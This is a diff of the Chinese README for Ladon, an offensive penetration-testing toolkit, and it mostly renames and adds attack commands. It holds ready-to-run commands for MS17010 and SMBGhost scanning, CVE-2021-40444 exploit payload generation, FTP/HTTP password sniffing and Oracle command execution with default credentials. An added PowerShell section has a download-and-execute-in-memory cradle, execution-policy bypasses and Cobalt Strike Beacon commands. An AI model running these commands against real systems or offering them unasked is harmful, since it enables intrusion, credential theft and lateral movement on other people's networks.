@@ -140,7 +140,7 @@ Ladon 10.1.2.8/24 MS17010 f=1
 ### 002 Socks5代理扫描
 例子：使用8线程扫描目标10.1.2段是否存在MS17010漏洞<br>
 ```Bash
-Ladon noping 10.1.2.8/24 MS17010 t=8<br>
+Ladon noping 10.1.2.8/24 MS17010 t=8
 ```
 
 详见：http://k8gege.org/Ladon/proxy.html
@@ -253,18 +253,18 @@ Ladon 192.168.1.8/24 OnlinePC
 
 ##### 015 多协议识别操作系统 （IP、机器名、操作系统版本、开放服务）
 ```Bash
-Ladon 192.168.1.8/24 OsScan
+Ladon 192.168.1.8/24 OsInfo
 ```
 
 ##### 016 OXID探测多网卡主机
 ```Bash
-Ladon 192.168.1.8/24 EthScan
-Ladon 192.168.1.8/24 OxidScan
+Ladon 192.168.1.8/24 EthInfo
+Ladon 192.168.1.8/24 OxidInfo
 ```
 
 ##### 017 DNS探测多网卡主机
 ```Bash
-Ladon 192.168.1.8/24 DnsScan
+Ladon 192.168.1.8/24 DnsInfo
 ```
 
 ##### 018 多协议扫描存活主机IP
@@ -284,6 +284,8 @@ Ladon 192.168.1.8/24 SMBGhost
 
 ##### 021 扫描Web标题 Banner 更全信息请使用WhatCMS模块探测
 ```Bash
+Ladon 192.168.1.8/24 WebInfo
+Ladon http://192.168.1.8 WebInfo
 Ladon 192.168.1.8/24 WebScan
 Ladon http://192.168.1.8 WebScan
 ```
@@ -335,8 +337,10 @@ Ladon 192.168.1.8/24 PortScan
 Ladon 192.168.1.8 PortScan 80,445,3389
 ```
 
-##### 029 扫描C段WEB及识别CMS（86+Web指纹识别）
+##### 029 扫描C段WEB及识别CMS（800+Web指纹识别）
 ```Bash
+Ladon 192.168.1.8/24 CMS
+Ladon 192.168.1.8/24 CmsInfo
 Ladon 192.168.1.8/24 WhatCMS
 ```
 
@@ -358,12 +362,12 @@ Ladon EnumShare
 
 ##### 033 扫描LDAP服务器(探测域控)
 ```Bash
-Ladon 192.168.1.8/24 LdapScan
+Ladon 192.168.1.8/24 LdapInfo
 ```
 
 ##### 034 扫描FTP服务器并识别版本
 ```Bash
-Ladon 192.168.1.8/24 FtpScan
+Ladon 192.168.1.8/24 FtpInfo
 ```
 
 ### 暴力破解/网络认证/弱口令/密码爆破/数据库/网站后台/登陆口/系统登陆
@@ -545,7 +549,7 @@ Ladon CmdDll b64x64 YwBhAGwAYwA=
 
 ##### 066 CVE-2021-40444  微软IE/Office 0day漏洞
 ```Bash
-Ladon CVE-2021-40444 MakeCab poc.dll<br>
+Ladon CVE-2021-40444 MakeCab poc.dll
 Ladon CVE-2021-40444 MakeHtml http://192.168.1.8
 ```
 
@@ -600,11 +604,13 @@ Ladon str.txt DeBase64
 ### 网络嗅探
 
 ##### 075 Ftp密码嗅探(绑定本机IP，自动嗅探C段)
+多网卡机器，嗅探对应C段IP
 ```Bash
 Ladon FtpSniffer 192.168.1.5
 ```
 
 ##### 076 HTTP密码嗅探(绑定本机IP，自动嗅探C段)
+多网卡机器，嗅探对应C段IP
 ```Bash
 Ladon HTTPSniffer 192.168.1.5
 ```
@@ -645,9 +651,16 @@ Ladon DumpLsass
 
 ![image](http://k8gege.org/k8img/Ladon/Study/Linfo.PNG)
 
+##### 083 API查看当前用户	
+```Bash
+Ladon w
+Ladon whoami
+```
+
 ##### 083 获取本机内网IP与外网IP 	
 ```Bash
 Ladon GetIP
+Ladon IPinfo
 ```
 
 ##### 084 获取PCname GUID CPUID DiskID Mac地址
@@ -1893,7 +1906,58 @@ Ladon OracleCmd 192.168.1.8 1521 orcl admin 123456 m2 whoami
 Ladon OracleCmd 192.168.1.8 1521 orcl admin 123456 m3 whoami
 ```
 
+## PowerShell版本 Ladon.ps1
 
+
+#### 0x001 Cmd交互执行
+```Bash	
+powershell 
+Import-Module .\Ladon.ps1
+Ladon OnlinePC
+```
+	
+#### 0x002 本地非交互执行
+```Bash	
+powershell -exec bypass Import-Module .\Ladon.ps1;Ladon whoami
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass Import-Module .\Ladon.ps1;Ladon whoami
+```	
+
+
+#### 0x003 远程内存加载执行
+```Bash	
+powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.8/Ladon.ps1'); Ladon OnlinePC"
+```	
+
+#### 0x004 Bypass绕过PowerShell默认策略执行
+```Bash	
+powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon OnlinePC
+```	
+
+#### 0x005 自定义端口扫描
+```Bash	
+powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon PortScan '22,80,135,445'
+```	
+
+#### Cobalt Strike  Ladon.ps1
+
+CS Beacon命令 探测存活主机
+```bash
+shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon ICMP
+shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon NbtInfo
+shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon SmbInfo
+shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon LdapInfo
+```
+
+CS Beacon命令 自定义端口扫描
+```bash
+shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon PortScan '22,80,135,445'
+```
+
+CS Beacon命令 MS17010漏洞探测
+#### Cobalt Strike
+```bash
+shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon 192.168.1.1/24 ms17010
+```
 
 =======================================================
 
